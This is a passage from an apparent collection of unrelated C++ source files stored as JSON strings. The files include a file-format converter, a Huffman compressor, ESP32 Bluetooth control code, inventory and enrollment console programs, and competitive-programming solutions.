buffer[strLength] = '\\0';\n            std::string value = buffer;\n            std::replace(value.begin(), value.end(), '\\n', '#');\n            txt << \"Content\" << j << \"=\" << value << \"\\n\";\n        }\n    }\n}\n\nvoid convertTxtToInf(const std::string& inputFile, const std::string& outputFile) {\n    std::ifstream txt(inputFile);\n    std::ofstream inf(outputFile, std::ios::binary);\n\n    if (!txt.is_open() || !inf.is_open()) {\n        throw std::runtime_error(\"Erro ao abrir arquivos.\");\n    }\n\n    int npcScriptCount;\n    txt.ignore(16); // Ignorar \"NpcScriptCount=\"\n    txt >> npcScriptCount;\n    inf.write(reinterpret_cast<char*>(&npcScriptCount), sizeof(npcScriptCount));\n\n    std::string line, key, value;\n    char buffer[2048];\n\n    for (int i = 1; i <= npcScriptCount; ++i) {\n        txt.ignore(256, '\\n'); // Ignorar \"[i]\"\n        txt.ignore(3);         // Ignorar \"ID=\"\n        int id;\n        txt >> id;\n        inf.write(reinterpret_cast<char*>(&id), sizeof(id));\n\n        txt.ignore(10); // Ignorar \"OwnerID=\"\n        std::getline(txt, value);\n        checkStringLength(value.length());\n        std::strcpy(buffer, value.c_str());\n        int strLength = value.length();\n        inf.write(reinterpret_cast<char*>(&strLength), sizeof(strLength));\n        inf.write(buffer, strLength);\n\n        txt.ignore(16); // Ignorar \"SubjectCount=\"\n        int subjectCount;\n        txt >> subjectCount;\n        inf.write(reinterpret_cast<char*>(&subjectCount), sizeof(subjectCount));\n\n        for (int j = 1; j <= subjectCount; ++j) {\n            txt.ignore(256, '=');\n            std::getline(txt, value);\n            std::replace(value.begin(), value.end(), '#', '\\n');\n            strLength = value.length();\n            checkStringLength(strLength);\n            std::strcpy(buffer, value.c_str());\n            inf.write(reinterpret_cast<char*>(&strLength), sizeof(strLength));\n            inf.write(buffer, strLength);\n        }\n\n        txt.ignore(16); // Ignorar \"ContentCount=\"\n        int contentCount;\n        txt >> contentCount;\n        inf.write(reinterpret_cast<char*>(&contentCount), sizeof(contentCount));\n\n        for (int j = 1; j <= conte",
    "/*\nFirst Completely Painted Row or Column\nYou are given a 0-indexed integer array arr, and an m x n integer matrix mat. arr and mat both contain all the integers in the range [1, m * n].\nGo through each index i in arr starting from index 0 and paint the cell in mat containing the integer arr[i].\nReturn the smallest index i at which either a row or a column will be completely painted in mat.\n*/\nclass Solution {\npublic:\n    int firstCompleteIndex(vector<int>& arr, vector<vector<int>>& mat) {\n        //hash array of element with (row,col)\n\n        int n=mat.size();\n        int m=mat[0].size();\n        vector<pair<int,int>> hash(m*n+1,{-1,-1});\n        for(int i=0;i<n;i++){\n            for(int j=0;j<m;j++){\n                hash[mat[i][j]]={i,j};\n            }\n        }\n        //each row contains m element\n        vector<int> rows(n,m);\n        //each col contains n element\n        vector<int> cols(m,n);\n\n        for(int i=0;i<m*n;i++){\n            auto p=hash[arr[i]];\n            int row=p.first;\n            int col=p.second;\n            rows[row]--;\n            if(rows[row]==0) return i;\n            cols[col]--;\n            if(cols[col]==0) return i;\n        }\n        //dummy return\n        return -1;\n    }\n};",
    "/*\nAuthor : ssp3edy \nDate : 2019-June-06\n*/\n\n#include <iostream>\n#include <string.h>\n#include <malloc.h>\n#include <fstream>\n#include <string>\n#include \"compression.h\"\n\n//Internal and Leaf nodes\n#define LEAF 0\n#define INTERNAL 1\n\ntypedef struct node \n{\n    char x;\n    int freq;\n    char* code;\n    int type;\n    struct node* next;\n    struct node* left;\n    struct node* right;\n\n} node;\n\n//Head and root nodes  in the linked list.\nnode *HEAD, *ROOT;\n\n\nvoid printll();\nvoid makeTree();\nvoid genCode(node *p,char* code);\nvoid insert(node *p,node *m);\nvoid addSymbol(char c);\nvoid writeHeader(FILE *f);\nvoid writeBit(int b,FILE *f);\nvoid writeCode(char ch,FILE *f);\nchar *getCode(char ch);\n\nnode* newNode(char c)\n{\n    node *temp;\n    temp = new node;\n    temp->x = c;\n    temp->type = LEAF;\n    temp->freq = 1;\n    temp->next = NULL;\n    temp->left = NULL;\n    temp->right = NULL;\n    return temp;\n}\n\nint main(int argc, char** argv)\n{\n    FILE *fp, *fp1;\n    char ch;\n    int t;\n    HEAD = NULL;\n    ROOT = NULL;\n\n    if(argc <= 2)\n    {\n        printf(\"\\n***Automated File Compression***\\n\");\n        printf(\"\\nCreating new compressed file...............\\n\");\n        argv[2]=(char *)malloc(sizeof(char)*(strlen(argv[1])+strlen(compressed_extension)+1));\n\t\tstrcpy(argv[2],argv[1]);\n\t\tstrcat(argv[2],compressed_extension);\n\t\targc++;\n    }\n    else \n        return 0;\n    \n    fp = fopen(argv[1],\"rb\");\n    if(fp == NULL)\n    {\n        printf(\"Error, Input file does not exists, Check the file name\\n\");\n        return -1;\n    }\n\n    printf(\"Initiating the compression sequence.................\\n\");\n    printf(\"Reading input file %s\\n\",argv[1]);\n    while(fread(&ch,sizeof(char),1,fp)!=0)\n        addSymbol(ch);\n    fclose(fp);\n\n    printf(\"Constructing Huffman-Tree....................\\n\");\n    makeTree();\n    printf(\"Assigning codewords..........................\\n\");\n    //Pre order traversal of the of the huffman code.\n    genCode(ROOT,\"\\0\");\n\n    printf(\"Compressing the file.........................\\n\");\n    fp=fopen(argv[1],\"r\");\n    if(fp==NULL)\n    {\n        printf(\"\\n[!]Input file cannot be opened.\\n\");\n        return -1;\n    }\n    fp1=fopen(argv[2],\"wb\");\n    if(fp1==NULL)\n    {\n        printf(\"\\n[!]Output file cannot be opened.\\n\");\n        return -2;\n    }\n\n    printf(\"\\nReading input file %s.......................\",argv[1]);\n    printf(\"\\nWriting file %s........................\",argv[2]);\n    printf(\"\\nWriting File Header..............................\");\n        writeHeader(fp1);\n    printf(\"\\nWriting compressed content............................\");\n    //writing corersponding codes into the new file fp1\n    while(fread(&ch,sizeof(char),1,fp)!=0)\n        writeCode(ch,fp1);\n    fclose(fp);\n    fclose(fp1);\n\n    printf(\"\\n***Done***\\n\");\n    return 0;\n\n}\n\n\nvoid writeHeader(FILE *f)\n{\n    //mapping of codes to actual words\n    codeTable record;\n    node *p;\n    int temp =0, i=0;\n    p = HEAD;\n    //Determine the uniwue symbols and padding of bits\n    while(p!=NULL)\n    {\n        temp+=(strlen(p->code)) * (p->freq);\t\t//temp stores padding\n        if(strlen(p->code) > MAX) printf(\"\\n[!] Codewords are longer than usual.\");\t//TODO: Solve this case\n        temp%=8;\n        i++;\n        p=p->next;\n    }\n\n    if(i==256)\n        N=0;\t//if 256 diff bit combinations exist, then alias 256 as 0\n    else \n        N=i;\n    \n    fwrite(&N,sizeof(unsigned char),1,f);\t//read these many structures while reading\n    printf(\"\\nN=%u\",i);\n\n\n    p=HEAD;\n    //Start from the HEAD and wirte all character with its corresponding codes\n    while(p!=NULL)\t\n    {\n        record.x=p->x;\n        strcpy(record.code,p->code);\n        fwrite(&record,sizeof(codeTable),1,f);\n        p=p->next;\n    }\n\n    padding=8-(char)temp;\t//int to char & padding = 8-bitsExtra\n    fwrite(&padding,sizeof(char),1,f);\n    printf(\"\\nPadding=%d\",padding);\n    //do actual padding\n    for(i=0;i<padding;i++)\n        writeBit(0,f);\n\n}\n\nvoid writeCode(char ch,FILE *f)\n{\nchar *code;\n//getting code of each character form the file\ncode=getCode(ch);\n//printf(\"\\n%s\\n\",code);\n\twhile(*code!='\\0')\n\t{\n        //Write into file 1 if the code is one\n\t\tif(*code=='1')\n\t\t\twriteBit(1,f); //write bit 1 into file f\n        //Write 0 bit in file the corrensponding code is 0\n\t\telse\n\t\t\twriteBit(0,f);\n\tcode++;\n\t}\n\treturn;\n}\n\n//Function to wite the bit value to the file \nvoid writeBit(int b,FILE *f)\n{//My Logic: Maintain static buffer, if it is full, write into file \n\tstatic char byte;\n\tstatic int cnt;\n\tchar temp;\n\t//printf(\"\\nSetting %dth bit = %d of %d \",cnt,b,byte);\n\tif(b==1)\n\t{\ttemp=1;\n\t\ttemp=temp<<(7-cnt);\t\t//right shift bits\n\t\tbyte=byte | temp;\n\t}\n\tcnt++;\n\t\n\tif(cnt==8)\t//buffer full\n\t{\n//\t\tprintf(\"[%s]\",bitsInChar(byte));\n\t\tfwrite(&byte,sizeof(char),1,f);\n\t\tcnt=0; byte=0;\t//reset buffer\n\t\treturn;// buffer written to file\n\t}\n\treturn;\n}\n\n//getting correaponding code from the linked list, whose character is given\nchar *getCode(char ch)\n{\nnode *p=HEAD;\n\twhile(p!=NULL)\n\t{\n        //LOGIC: check if the passed c",
    "#include \"destructiondebris.h\"\n#include \"raymath.h\"\n\nDestructionDebris::DestructionDebris(Texture2D dImage, float lifetime) : debrisImage(dImage), debrisLiftime(lifetime)\n{\n\tSetupDebris(); \n}\n\nDestructionDebris::~DestructionDebris()\n{\n\n}\n\n//-------------------- Destruction Debris Tick -------------------- \nvoid DestructionDebris::Tick(float dt)\n{\n\tif (isDebrisActive)\n\t{\n\t\tDebrisMovement(dt); \n\t\tDraw(); \n\t\tdebrisCurrentLiftime -= dt; \n\t}\n\n\tif (debrisCurrentLiftime <= 0)\n\t{\n\t\tisDebrisActive = false; \n\t\tdebrisCurrentLiftime = debrisLiftime; \n\t}\n}\n\n//-------------------- Destruction Debris Draw -------------------- \nvoid DestructionDebris::Draw()\n{\n\tconst Rectangle debrisSourceRec = { 0.0f, 0.0f, (float)debrisImage.width, (float)debrisImage.height };\n\tRectangle debrisDesinationRec = Rectangle{ debrisCurrentPosition.x, debrisCurrentPosition.y,(float)debrisImage.width, (float)debrisImage.height };\n\tVector2 debrisOrigin = Vector2{ (float)debrisDesinationRec.width / 2, (float)debrisDesinationRec.height / 2 };\n\tDrawTexturePro(debrisImage, debrisSourceRec, debrisDesinationRec, debrisOrigin, debrisCurrentRotation, WHITE);\n}\n\n//-------------------- Destruction Debris Setup Debris -------------------- \nvoid DestructionDebris::SetupDebris()\n{\n\tdebrisCurrentRotation = (float)GetRandomValue(debrisMinRotation, debrisMaxRotation); \n\n\tdebrisCurrentSpeed = (float)GetRandomValue((int)debrisMinSpeed, (int)debrisMaxSpeed); \n\n\tdebrisCurrentLiftime = debrisLiftime; \n\n\tisDebrisActive = false; \n}\n\n//-------------------- Destruction Debris Movement -------------------- \nvoid DestructionDebris::DebrisMovement(float dt)\n{\n\tdebrisCurrentPosition.x += debrisCurrentSpeed * cos(debrisCurrentRotation * DEG2RAD) * dt; \n\tdebrisCurrentPosition.y += debrisCurrentSpeed * sin(debrisCurrentRotation * DEG2RAD) * dt;\n}",
    "#include <Arduino.h>\n#include <Wire.h>\n#include <Adafruit_NeoPixel.h>\n#include \"BluetoothA2DPSink.h\"\n#include \"AudioTools.h\"\n\n#define DEBUG_BT_AUDIO false\n\n#define I2C_ADDRESS 0x03\n#define MAX_BT_DATA_LENGTH 136\n\n#define CONFIG_I2S_LRCK_PIN G22\n#define CONFIG_I2S_BCK_PIN G19\n#define CONFIG_I2S_DATA_PIN G23\n\nI2SStream i2s;\nBluetoothA2DPSink a2dp_sink(i2s);\nAdafruit_NeoPixel pixels = Adafruit_NeoPixel(1, G27, NEO_GRB + NEO_KHZ800);\nunsigned long last = 0;\n\n// Add these global variables to store metadata\nstruct MetadataStore\n{\n  String title;\n  String artist;\n  unsigned long lastUpdate;\n  esp_avrc_playback_stat_t playbackState;\n  bool isConnected;\n} metadata;\n\nvolatile byte i2cRegister = 0xff;\n\n// Add to global variables\n#define COMMAND_COOLDOWN 1000 // 1 second cooldown between commands\nvolatile bool needsRecovery = false;\nvolatile uint8_t lastAudioState = 2;\n\n// Debug logging macros\n#if DEBUG_BT_AUDIO\n#define LOG_DEBUG(x) Serial.println(x)\n#define LOG_DEBUGF(x, ...) Serial.printf(x, __VA_ARGS__)\n#else\n#define LOG_DEBUG(x)\n#define LOG_DEBUGF(x, ...)\n#endif\n\n// Add to global variables\n#define ESP_AVRC_RN_PLAY_POS_CHANGED 0x05\n\nvoid i2cReceive(int numBytes)\n{\n  static unsigned long lastCommandTime = 0;\n  bool validCommand = false;\n\n  LOG_DEBUGF(\"I2C Receive called with %d bytes\\n\", numBytes);\n  pixels.setPixelColor(0, pixels.Color(0, 0, 255));\n\n  if (numBytes < 1)\n  {\n    LOG_DEBUG(\"No bytes received\");\n    goto cleanup;\n  }\n\n  i2cRegister = Wire.read();\n  LOG_DEBUGF(\"Command received: '%c' (0x%02X)\\n\", i2cRegister, i2cRegister);\n\n  // Check cooldown\n  if (millis() - lastCommandTime < COMMAND_COOLDOWN)\n  {\n    LOG_DEBUG(\"Command ignored - in cooldown period\");\n    pixels.setPixelColor(0, pixels.Color(255, 165, 0));\n    goto cleanup;\n  }\n\n  // Process command\n  switch (i2cRegister)\n  {\n  case 'p': // play\n    pixels.setPixelColor(0, pixels.Color(0, 255, 0));\n    a2dp_sink.play();\n    validCommand = true;\n    break;\n  case 's': // stop\n    pixels.setPixelColor(0, pixels.Color(255, 0, 0));\n    a2dp_sink.pause();\n    validCommand = true;\n    break;\n  case 'r': // previous\n    a2dp_sink.previous();\n    validCommand = true;\n    break;\n  case 'n': // next\n    a2dp_sink.next();\n    validCommand = true;\n    break;\n  }\n\n  if (validCommand)\n  {\n    lastCommandTime = millis();\n    LOG_DEBUGF(\"Executed command: %c\\n\", i2cRegister);\n  }\n\ncleanup:\n  // Clean up I2C buffer\n  while (Wire.available())\n  {\n    Wire.read();\n  }\n  pixels.show();\n}\n\nvoid i2cRequest()\n{\n  static unsigned long lastRequestTime = 0;\n  static uint16_t requestCount = 0;\n  const int MAX_FIELD_LENGTH = 32;\n  static char buffer[MAX_BT_DATA_LENGTH];\n\n  unsigned long now = millis();\n  unsigned long delta = now - lastRequestTime;\n  LOG_DEBUGF(\"I2C Request at %lu (delta: %lu ms)\\n\", now, delta);\n\n  if (delta > 1000)\n  {\n    LOG_DEBUG(\"Large timing gap detected!\");\n    LOG_DEBUGF(\"Audio State: %d\\n\", a2dp_sink.get_audio_state());\n    LOG_DEBUGF(\"I2S Sample Rate: %d\\n\", a2dp_sink.sample_rate());\n    LOG_DEBUGF(\"Wire Available: %d\\n\", Wire.available());\n  }\n  LOG_DEBUGF(\"Attempting to write %d bytes\\n\", MAX_BT_DATA_LENGTH);\n\n  // Build response string\n  String dataToSend = \"\";\n\n  if (!a2dp_sink.is_connected())\n  {\n    dataToSend += \"|T-|A-|SUNKNOWN|Cdisconnected\";\n  }\n  else\n  {\n    const char *stateStr = (metadata.playbackState == ESP_AVRC_PLAYBACK_PLAYING) ? \"PLAYING\" : \"STOPPED\";\n\n    if (metadata.playbackState == ESP_AVRC_PLAYBACK_PLAYING)\n    {\n      dataToSend += \"|T\" + (metadata.title.length() ? metadata.title.substring(0, MAX_FIELD_LENGTH) : \"-\");\n      dataToSend += \"|A\" + (metadata.artist.length() ? metadata.artist.substring(0, MAX_FIELD_LENGTH) : \"-\");\n    }\n    else\n    {\n      dataToSend += \"|T-|A-\";\n    }\n\n    dataToSend += \"|S\" + String(stateStr);\n    dataToSend += \"|C\" + String(a2dp_sink.get_peer_name()).substring(0, MAX_FIELD_LENGTH);\n  }\n\n  // Copy to buffer with null termination\n  strncpy(buffer, dataToSend.c_str(), MAX_BT_DATA_LENGTH - 1);\n  buffer[MAX_BT_DATA_LENGTH - 1] = '\\0';\n\n  Wire.write((uint8_t *)buffer, MAX_BT_DATA_LENGTH);\n\n  LOG_DEBUGF(\"Write complete. Sent: %s\\n\", buffer);\n  lastRequestTime = now;\n}\n\nvoid avrc_metadata_callback(uint8_t id, const uint8_t *text)\n{\n  switch (id)\n  {\n  case ESP_AVRC_MD_ATTR_TITLE:\n    metadata.title = String((char *)text);\n    break;\n  case ESP_AVRC_MD_ATTR_ARTIST:\n    metadata.artist = String((char *)text);\n    break;\n  }\n  metadata.lastUpdate = millis();\n}\n\nvoid avrc_rn_playstatus_callback(esp_avrc_playback_stat_t playback)\n{\n  metadata.playbackState = playback;\n  metadata.lastUpdate = millis();\n\n  if (playback == ESP_AVRC_PLAYBACK_STOPPED ||\n      playback == ESP_AVRC_PLAYBACK_PAUSED)\n  {\n    LOG_DEBUG(\"Audio playback stopped\");\n    LOG_DEBUGF(\"A2DP Audio State: %d\\n\", a2dp_sink.get_audio_state());\n    LOG_DEBUGF(\"A2DP Audio Type: %d\\n\", a2dp_sink.get_audio_type());\n    LOG_DEBUGF(\"I2S Sample Rate: %d\\n\", a2dp_sink.sample_rate());\n\n    // Set up timer to monitor for BT stack state changes\n    static h",
    "#include <iostream> // Required for input/output operations\n#include <string>   // Required for string handling\n#include <limits>   // Required for numeric limits\n\nusing namespace std;\n\n// Constants for maximum inventory items\nconst int MAX_ITEMS = 100;\n#define Max_Prod 100\n\n// Product struct to hold product details\nstruct Product {\n\tstring name;\n\tint quantity;\n\tdouble price;\n};\n// Function to add a new product to the catalog\n// Parameters:\n// - productCount: reference to the current count of products in the catalog (updated in this function)\n// - nextID: reference to the next product ID (not used directly but could track product IDs in future expansions)\n// - catalog: array of Product structures that holds the inventory items\nvoid addProduct(int &productCount, int &nextID, Product catalog[]);\n\n// Function to display all products currently in the catalog\n// Parameters:\n// - productCount: current number of products in the catalog\n// - catalog: array of Product structures representing the inventory\nvoid viewProducts(int productCount, Product catalog[]);\n\n// Function to edit an existing product's details in the catalog\n// Parameters:\n// - productCount: current number of products in the catalog\n// - catalog: array of Product structures representing the inventory\nvoid editProduct(int productCount, Product catalog[]);\n\n// Function to delete a product from the catalog\n// Parameters:\n// - productCount: reference to the current count of products in the catalog (updated in this function)\n// - catalog: array of Product structures representing the inventory\nvoid deleteProduct(int &productCount, Product catalog[]);\n\n// Function to validate numeric input from the user\n// This function returns true if the input is valid and false if it's invalid\nbool isValidInput();\n\n// Function to display the available products in the catalog (used for point-of-sale operations)\n// Parameters:\n// - catalog: constant array of Product structures representing the inventory\n// - size: the number of products in the catalog\nvoid displayProducts(const Product catalog[], int size);\n\n// Function to display the receipt for purchased items\n// Parameters:\n// - purchasedItems: array of Product structures representing the items bought by the customer\n// - itemCount: the number of items in the purchasedItems array\nvoid displayReceipt(const Product purchasedItems[], int itemCount);\n\n\nint main() {\n\tProduct catalog[Max_Prod];       // Array to hold inventory of products\n\tProduct purchasedItems[MAX_ITEMS]; // Array to hold purchased items\n\n\tint productCount = 0; // Tracks number of products in the inventory\n\tint nextID = 1;       // ID tracker for each product (not used in current version)\n\tint itemCount = 0;    // Count of items purchased in POS system\n\tint choice;           // Holds user choice from menu\n\n\tdo {\n\t\tsystem(\"clear\"); // Clear the console screen\n\t\tcout << \"\\nSystem Menu\\n\"; //print \"System Menu\"\n\t\tcout << \"1. Inventory Management\\n\"; //print \"Inventory Management\"\n\t\tcout << \"2. Point of Sale (POS)\\n\"; //print \"Point of Sale\"\n\t\tcout << \"3. Exit\\n\"; //print \"Exit\"\n\t\tcout << \"Enter your choice: \"; //print \"Enter your choice\"\n\n\t\t// Validate input for menu choice\n\t\tif (!isValidInput()) { //if the input is not valid, display the following\n\t\t\tcout << \"Invalid input! Please enter a number.\\n\"; //print \"Invalid input! Please enter a number\" if the input is not a number\n\t\t\tcontinue; // Restart loop if input is invalid\n\t\t}\n\n\t\tcin >> choice; // store the input in the variable choice\n\n\t\tswitch (choice) { //check what the stored value of choice is\n\t\tcase 1: { // Inventory Management Menu\n\t\t\tint inventoryChoice; // create a variable to store the value of the user input \n\t\t\tdo { \n\t\t\t\tsystem(\"clear\"); // Clear the console screen\n\t\t\t\tcout << \"\\nInventory Management System\\n\"; // print \"Inventory Management System\"\n\t\t\t\tcout << \"1. Add Product\\n\"; // print \"Add Product\"\n\t\t\t\tcout << \"2. View Products\\n\"; // print \"View Product\"\n\t\t\t\tcout << \"3. Edit Product\\n\"; // print \"Edit Product\"\n\t\t\t\tcout << \"4. Delete Product\\n\"; // print \"Delete Product\"\n\t\t\t\tcout << \"5. Back to Main Menu\\n\"; // print \"Back to Main Menu\"\n\t\t\t\tcout << \"Enter your choice: \"; // print \"Enter your choice\"\n\n\t\t\t\t// Validate input for inventory choice\n\t\t\t\tif (!isValidInput()) { // if \n\t\t\t\t\tcout << \"Invalid input! Please enter a number.\\n\";\n\t\t\t\t\tcontinue; // Restart loop if input is invalid\n\t\t\t\t}\n\n\t\t\t\tcin >> inventoryChoice;\n\n\t\t\t\t// Execute appropriate function based on inventory choice\n\t\t\t\tswitch (inventoryChoice) {\n\t\t\t\tcase 1:\n\t\t\t\t\taddProduct(productCount, nextID, catalog);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tviewProducts(productCount, catalog);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\teditProduct(productCount, catalog);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 4:\n\t\t\t\t\tdeleteProduct(productCount, catalog);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 5:\n\t\t\t\t\tcout << \"Returning to Main Menu...\\n\";\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\tcout << \"Invalid choice! Please enter a valid option.\\n\";\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t} while (inventoryChoice != 5); // Loop until user chooses",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n\n#include \"pfs_common/pfs_common.hpp\"\n#include \"pfs_client/pfs_api.hpp\"\n#include \"pfs_client/pfs_cache.hpp\"\n\nint pfs_print_meta(int pfs_fd, int client_id) {\n    struct pfs_metadata mymeta = {0};\n    int ret = pfs_fstat(pfs_fd, &mymeta);\n    if (ret != -1) {\n        printf(\"%s: PFS fd: %d, Client id: %d\\n\", __func__, pfs_fd, client_id);\n        printf(\"%s: File name: %s, size: %lu\\n\", __func__, mymeta.filename, mymeta.file_size);\n        printf(\"%s: Time of creation: %s\", __func__, ctime(&(mymeta.ctime)));\n        printf(\"%s: Last modification: %s\", __func__, ctime(&(mymeta.mtime)));\n    }\n    return ret;\n}\n\nint main(int argc, char *argv[]) {\n    printf(\"%s:%s: Start! Hostname: %s, IP: %s\\n\", __FILE__, __func__, getMyHostname().c_str(), getMyIP().c_str());\n    if (argc < 2) {\n        fprintf(stderr, \"%s: usage: ./sample1-1 <input filename>\\n\", __func__);\n        return -1;\n    }\n\n    // Open a file\n    std::string input_filename(argv[1]);\n    int input_fd = open(input_filename.c_str(), O_RDONLY);\n    char *buf = (char *)malloc(8 * 1024);\n    ssize_t nread = pread(input_fd, (void *)buf, 1024, 1024);\n    if (nread != 1024) {\n        fprintf(stderr, \"pread() error.\\n\");\n        return -1;\n    }\n    close(input_fd);\n\n    // Initialize the PFS client\n    int client_id = pfs_initialize();\n    if (client_id == -1) {\n        fprintf(stderr, \"pfs_initialize() failed.\\n\");\n        return -1;\n    }\n\n    // Open the PFS file in write mode\n    int pfs_fd = pfs_open(\"pfs_file1\", 2);\n    if (pfs_fd == -1) {\n        fprintf(stderr, \"Error opening PFS file.\\n\");\n        return -1;\n    }\n\n    // Write the byte 1024~2047 to pfs_file1 at offset 1024\n    int ret = pfs_write(pfs_fd, (void *)buf, 1024, 1024);\n    if (ret == -1) {\n        fprintf(stderr, \"Write error to PFS file.\\n\");\n        return -1;\n    } else\n        printf(\"%s:%s: Wrote %d bytes to the PFS file.\\n\", __FILE__, __func__, ret);\n\n    // Print metadata\n    if (pfs_print_meta(pfs_fd, client_id) == -1) {\n        fprintf(stderr, \"PFS metadata print error.\\n\");\n        return -1;\n    };\n\n    ret = pfs_close(pfs_fd);\n    if (ret == -1) {\n        fprintf(stderr, \"Error closing PFS file.\\n\");\n        return -1;\n    }\n\n    ret = pfs_finish(client_id);\n    if (ret == -1) {\n        fprintf(stderr, \"pfs_finish() failed.\\n\");\n        return -1;\n    }\n\n    free(buf);\n    printf(\"%s:%s: Finish!\\n\", __FILE__, __func__);\n    return 0;\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\n// Estructura para almacenar la informacion de un estudiante\nclass Estudiante {\npublic:\n    string nombre;\n    string cedula;\n    string carrera;\n    string nivel;\n\n    Estudiante(string nombre, string cedula, string carrera, string nivel)\n        : nombre(nombre), cedula(cedula), carrera(carrera), nivel(nivel) {}\n};\n\n// Estructura para almacenar la informacion de un curso\nclass Curso {\npublic:\n    string nombre;\n    string codigo;\n    int creditos;\n    string profesor;\n\n    Curso(string nombre, string codigo, int creditos, string profesor)\n        : nombre(nombre), codigo(codigo), creditos(creditos), profesor(profesor) {}\n};\n\n// Estructura para almacenar la informacion del horario\nclass Horario {\npublic:\n    string dia;\n    string hora_inicio;\n    string hora_fin;\n    string aula;\n\n    Horario(string dia, string hora_inicio, string hora_fin, string aula)\n        : dia(dia), hora_inicio(hora_inicio), hora_fin(hora_fin), aula(aula) {}\n};\n\n// Estructura para gestionar la matricula de los estudiantes\nclass Matricula {\npublic:\n    Estudiante* estudiante;\n    vector<Curso*> cursos;\n    double costo;\n\n    Matricula(Estudiante* estudiante)\n        : estudiante(estudiante), costo(0) {}\n\n    void registrarCurso(Curso* curso) {\n        cursos.push_back(curso);\n        costo += curso->creditos * 50.0;  // Suponemos que cada credito cuesta 50 unidades\n    }\n\n    void mostrarMatricula() {\n        cout << \"Estudiante: \" << estudiante->nombre << endl;\n        cout << \"Cursos Matriculados: \" << endl;\n        for (auto& curso : cursos) {\n            cout << \"- \" << curso->nombre << \" (\" << curso->codigo << \")\" << endl;\n        }\n        cout << \"Costo total: \" << costo << endl;\n    }\n};\n\nclass Sistema {\nprivate:\n    vector<Estudiante> estudiantes;\n    vector<Curso> cursos;\n    vector<Horario> horarios;\n    vector<Matricula> matriculas;\n\npublic:\n    void mostrarMenu() {\n        cout << \"\\n1. Archivo\\n\";\n        cout << \"   1.1 Acerca de\\n\";\n        cout << \"   1.2 Salir\\n\";\n        cout << \"2. Mantenimiento\\n\";\n        cout << \"   2.1 Estudiantes\\n\";\n        cout << \"   2.2 Cursos\\n\";\n        cout << \"   2.3 Horarios\\n\";\n        cout << \"3. Matricula\\n\";\n        cout << \"   3.1 Registro de Matricula\\n\";\n        cout << \"4. Consulta\\n\";\n        cout << \"   4.1 Estudiantes\\n\";\n        cout << \"   4.2 Cursos\\n\";\n        cout << \"Selecciona una opcion: \";\n    }\n\n    void mostrarAcercaDe() {\n        cout << \"\\nSistema desarrollado por el Ingeniero Anderson Chacon, \"\n            << \"dueno de Futures Company.\\n\"\n            << \"Este sistema fue desarrollado para brindar un uso facil \"\n            << \"al sistema de matricula de la Universidad Nacional.\\n\"\n            << \"El sistema creado es muy intuitivo y facil de usar, \"\n            << \"disfruten del programa.\\n\"\n            << \"Soporte tecnico a 62929423 y chaconsamuel8@gmail.com\\n\";\n    }\n\n    void agregarEstudiante() {\n        string nombre, cedula, carrera, nivel;\n        cout << \"Nombre del estudiante: \";\n        cin >> nombre;\n        cout << \"Cedula: \";\n        cin >> cedula;\n        cout << \"Carrera: \";\n        cin >> carrera;\n        cout << \"Nivel: \";\n        cin >> nivel;\n\n        estudiantes.push_back(Estudiante(nombre, cedula, carrera, nivel));\n        cout << \"Estudiante registrado exitosamente.\" << endl;\n    }\n\n    void agregarCurso() {\n        string nombre, codigo, profesor;\n        int creditos;\n        cout << \"Nombre del curso: \";\n        cin >> nombre;\n        cout << \"Codigo: \";\n        cin >> codigo;\n        cout << \"Creditos: \";\n        cin >> creditos;\n        cout << \"Profesor: \";\n        cin >> profesor;\n\n        cursos.push_back(Curso(nombre, codigo, creditos, profesor));\n        cout << \"Curso registrado exitosamente.\" << endl;\n    }\n\n    void agregarHorario() {\n        string dia, hora_inicio, hora_fin, aula;\n        cout << \"Dia: \";\n        cin >> dia;\n        cout << \"Hora de inicio: \";\n        cin >> hora_inicio;\n        cout << \"Hora de fin: \";\n        cin >> hora_fin;\n        cout << \"Aula: \";\n        cin >> aula;\n\n        horarios.push_back(Horario(dia, hora_inicio, hora_fin, aula));\n        cout << \"Horario registrado exitosamente.\" << endl;\n    }\n\n    void registrarMatricula() {\n        string cedula;\n        cout << \"Ingrese la cedula del estudiante: \";\n        cin >> cedula;\n\n        Estudiante* estudiante = nullptr;\n        for (auto& est : estudiantes) {\n            if (est.cedula == cedula) {\n                estudiante = &est;\n                break;\n            }\n        }\n\n        if (estudiante == nullptr) {\n            cout << \"Estudiante no encontrado.\" << endl;\n            return;\n        }\n\n        Matricula matricula(estudiante);\n\n        cout << \"Cursos disponibles:\" << endl;\n        for (int i = 0; i < cursos.size(); i++) {\n            cout << i + 1 << \". \" << cursos[i].nombre << endl;\n        }\n\n        int opcion;\n        cout << \"Seleccione el curs",
    "#include<bits/stdc++.h>\n#define int long long\n#define pii pair<int, int>\n#define f0 first\n#define s0 second\n#define pb push_back\nusing namespace std;\n\nint constexpr maxn = 109, maxm = 109;\n\nint n, m, dp[maxn][maxn][maxm], divi[maxm][maxm], mod = 998244353;\n\nvoid preprocess(){\n\n\treturn;\n}\n\nvoid give_input(){\n    cin >> n >> m;\n    for(int i = 0; i < n; ++i){\n        int num;\n        cin >> num;\n        num %= m, num = (num + m) % m;\n        dp[i][i + 1][num] = 1;\n    }\n    for(int i = 0; i < m; ++i)\n        for(int j = 0; j < m; ++j)\n            divi[(i * j) % m][i] = j;\n    for(int j = 2; j < n + 1; ++j)\n        for(int i = 0; i < n; ++i){\n            if(n < i + j)\n                continue;\n            int k = i + j;\n            for(int i1 = i + 1; i1 < k; ++i1)\n                for(int j1 = 0; j1 < m; ++j1){\n                    dp[i][k][0] = (dp[i][k][0] + dp[i][i1][0]) % mod;\n                    dp[i][k][0] = (dp[i][k][0] + dp[i1][k][j1]) % mod;\n                    for(int j2 = 0; j2 < m; ++j2){\n                        int num = (j1 - j2 + m) % m;\n                        dp[i][k][j1] = (dp[i][k][j1] + dp[i][i1][j2]) % mod;\n                        dp[i][k][j1] = (dp[i][k][j1] + 